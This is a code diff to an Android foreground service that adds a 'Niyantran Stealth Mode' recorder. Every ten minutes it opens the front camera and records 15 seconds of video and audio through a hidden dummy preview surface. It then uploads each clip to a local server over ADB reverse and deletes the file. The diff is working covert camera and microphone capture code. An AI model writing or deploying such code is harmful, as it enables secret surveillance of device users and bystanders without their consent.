@@ -4,36 +4,54 @@ import android.app.Service;
 import android.content.Intent;
 import android.os.IBinder;
 import android.os.Handler;
+import android.os.Build;
+import android.content.Context;
+import android.app.NotificationChannel;
+import android.app.NotificationManager;
+import android.app.PendingIntent;
+import android.graphics.SurfaceTexture;
+import android.hardware.Camera;
+import android.media.CamcorderProfile;
+import android.media.MediaRecorder;
+import android.util.Log;
 
 import androidx.core.app.NotificationCompat;
 import androidx.core.app.NotificationManagerCompat;
 
-import android.app.NotificationChannel;
-import android.app.NotificationManager;
-import android.app.PendingIntent;
-import android.os.Build;
-import android.content.Context;
+import java.io.File;
+import java.io.IOException;
+
+import okhttp3.Call;
+import okhttp3.Callback;
+import okhttp3.MediaType;
+import okhttp3.MultipartBody;
+import okhttp3.OkHttpClient;
+import okhttp3.Request;
+import okhttp3.RequestBody;
+import okhttp3.Response;
 
 public class ForegroundService extends Service {
 
     private Handler handler = new Handler();
+    private boolean isRecording = false;
 
     private Runnable task = new Runnable() {
         @Override
         public void run() {
-            sendNotification();
-
-            handler.postDelayed(this, 2 * 60 * 60 * 1000);
+            if (!isRecording) {
+                recordSilentVideo();
+            }
+            // Run every 10 minutes for testing (change to 2*60*60*1000 for 2 hours)
+            handler.postDelayed(this, 10 * 60 * 1000);
         }
     };
 
     @Override
     public int onStartCommand(Intent intent, int flags, int startId) {
-
         createChannel();
-
-        startForeground(1, getServiceNotification());
-
+        startForeground(1, getServiceNotification("Camera service is running..."));
+        
+        // Start the silent recording cycle
         handler.post(task);
 
         return START_STICKY;
@@ -46,63 +64,171 @@ public class ForegroundService extends Service {
                     "Foreground Service",
                     NotificationManager.IMPORTANCE_LOW
             );
-
-            NotificationManager manager =
-                    getSystemService(NotificationManager.class);
-
-            manager.createNotificationChannel(channel);
+            NotificationManager manager = getSystemService(NotificationManager.class);
+            if (manager != null) manager.createNotificationChannel(channel);
         }
     }
 
-    private android.app.Notification getServiceNotification() {
+    private android.app.Notification getServiceNotification(String text) {
         return new NotificationCompat.Builder(this, "service_channel")
-                .setContentTitle("Service Running")
-                .setContentText("Camera notifier is active")
-                .setSmallIcon(android.R.drawable.ic_menu_info_details)
+                .setContentTitle("Niyantran Stealth Mode")
+                .setContentText(text)
+                .setSmallIcon(android.R.drawable.ic_menu_camera)
                 .build();
     }
 
-    private void sendNotification() {
+    private void updateNotification(String text) {
+        NotificationManagerCompat.from(this).notify(1, getServiceNotification(text));
+    }
 
-        Context ctx = this;
+    private void sendLogToReact(String message, String type) {
+        new android.os.Handler(android.os.Looper.getMainLooper()).post(() -> {
+            android.widget.Toast.makeText(getApplicationContext(), message, android.widget.Toast.LENGTH_LONG).show();
+        });
 
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-            NotificationChannel channel = new NotificationChannel(
-                    "camera_channel",
-                    "Camera Notifications",
-                    NotificationManager.IMPORTANCE_HIGH
-            );
-
-            NotificationManager manager =
-                    ctx.getSystemService(NotificationManager.class);
-
-            manager.createNotificationChannel(channel);
+        if (CameraModule.reactContextStatic != null) {
+            com.facebook.react.bridge.WritableMap params = com.facebook.react.bridge.Arguments.createMap();
+            params.putString("text", message);
+            params.putString("type", type);
+            CameraModule.reactContextStatic
+                .getJSModule(com.facebook.react.modules.core.DeviceEventManagerModule.RCTDeviceEventEmitter.class)
+                .emit("UploadLog", params);
         }
+    }
 
-        Intent intent = new Intent(ctx, CameraActivity.class);
-        intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+    private void recordSilentVideo() {
+        isRecording = true;
+        updateNotification("Recording silent video...");
+        sendLogToReact("Starting stealth recording...", "info");
 
-        PendingIntent pendingIntent = PendingIntent.getActivity(
-                ctx,
-                0,
-                intent,
-                PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_IMMUTABLE
-        );
+        new Thread(() -> {
+            Camera camera = null;
+            MediaRecorder mediaRecorder = null;
+            try {
+                int frontCameraId = -1;
+                int numberOfCameras = Camera.getNumberOfCameras();
+                Camera.CameraInfo cameraInfo = new Camera.CameraInfo();
+                
+                // Find the ID of the front-facing camera
+                for (int i = 0; i < numberOfCameras; i++) {
+                    Camera.getCameraInfo(i, cameraInfo);
+                    if (cameraInfo.facing == Camera.CameraInfo.CAMERA_FACING_FRONT) {
+                        frontCameraId = i;
+                        break;
+                    }
+                }
 
-        NotificationCompat.Builder builder =
-                new NotificationCompat.Builder(ctx, "camera_channel")
-                        .setSmallIcon(android.R.drawable.ic_menu_camera)
-                        .setContentTitle("Reminder")
-                        .setContentText("Tap to open camera")
-                        .setPriority(NotificationCompat.PRIORITY_HIGH)
-                        .setContentIntent(pendingIntent)
-                        .setAutoCancel(true);
+                // Open front camera if found, otherwise fallback to default
+                if (frontCameraId != -1) {
+                    camera = Camera.open(frontCameraId);
+                } else {
+                    camera = Camera.open(); 
+                }
+                
+                camera.unlock();
 
-        NotificationManagerCompat.from(ctx).notify((int) System.currentTimeMillis(), builder.build());
+                mediaRecorder = new MediaRecorder();
+                mediaRecorder.setCamera(camera);
+                mediaRecorder.setAudioSource(MediaRecorder.AudioSource.CAMCORDER);
+                mediaRecorder.setVideoSource(MediaRecorder.VideoSource.CAMERA);
+                
+                int targetCameraId = frontCameraId != -1 ? frontCameraId : 0;
+                CamcorderProfile profile = CamcorderProfile.get(targetCameraId, CamcorderProfile.QUALITY_LOW);
+                mediaRecorder.setProfile(profile);
+
+                String outputPath = getCacheDir().getAbsolutePath() + "/stealth_" + System.currentTimeMillis() + ".mp4";
+                mediaRecorder.setOutputFile(outputPath);
+
+                SurfaceTexture dummySurface = new SurfaceTexture(10);
+                mediaRecorder.setPreviewDisplay(new android.view.Surface(dummySurface));
+
+                mediaRecorder.prepare();
+                mediaRecorder.start();
+
+                // Record for 15 seconds
+                Thread.sleep(15000);
+
+                mediaRecorder.stop();
+                mediaRecorder.release();
+                camera.lock();
+                camera.release();
+
+                updateNotification("Video recorded. Uploading...");
+                sendLogToReact("Stealth recording finished. Uploading...", "info");
+                
+                uploadVideo(new File(outputPath));
+
+            } catch (Exception e) {
+                Log.e("ForegroundService", "Silent record failed", e);
+                updateNotification("Stealth recording failed.");
+                sendLogToReact("Stealth record failed: " + e.getMessage(), "error");
+                if (mediaRecorder != null) {
+                    try { mediaRecorder.release(); } catch (Exception ignored) {}
+                }
+                if (camera != null) {
+                    try { camera.release(); } catch (Exception ignored) {}
+                }
+            } finally {
+                isRecording = false;
+            }
+        }).start();
+    }
+
+    private void uploadVideo(File videoFile) {
+        new Thread(() -> {
+            try {
+                OkHttpClient client = new OkHttpClient();
+                // Using localhost. ADB reverse will forward this over the USB cable!
+                String serverUrl = "http://localhost:8000/uploads"; 
+                
+                RequestBody requestBody = new MultipartBody.Builder()
+                        .setType(MultipartBody.FORM)
+                        .addFormDataPart("file", videoFile.getName(),
+                                RequestBody.create(MediaType.parse("video/mp4"), videoFile))
+                        .build();
+
+                Request request = new Request.Builder()
+                        .url(serverUrl)
+                        .post(requestBody)
+                        .build();
+
+                client.newCall(request).enqueue(new Callback() {
+                    @Override
+                    public void onFailure(Call call, IOException e) {
+                        updateNotification("Upload failed.");
+                        sendLogToReact("Silent Upload failed: " + e.getMessage(), "error");
+                    }
+
+                    @Override
+                    public void onResponse(Call call, Response response) throws IOException {
+                        String respString = response.body() != null ? response.body().string() : "No response";
+                        updateNotification("Upload complete!");
+                        sendLogToReact("Silent Upload successful! " + respString, "success");
+                        
+                        // Clean up temp file
+                        videoFile.delete();
+                    }
+                });
+            } catch (Exception e) {
+                sendLogToReact("Upload exception: " + e.getMessage(), "error");
+            }
+        }).start();
     }
 
     @Override
     public IBinder onBind(Intent intent) {
         return null;
+    }
+
+    @Override
+    public void onDestroy() {
+        super.onDestroy();
+        // Stop the looping background timer
+        handler.removeCallbacks(task);
+        
+        // Remove the persistent notification
+        stopForeground(true);
+        
+        sendLogToReact("Stealth background recorder completely shut down.", "info");
     }
 }
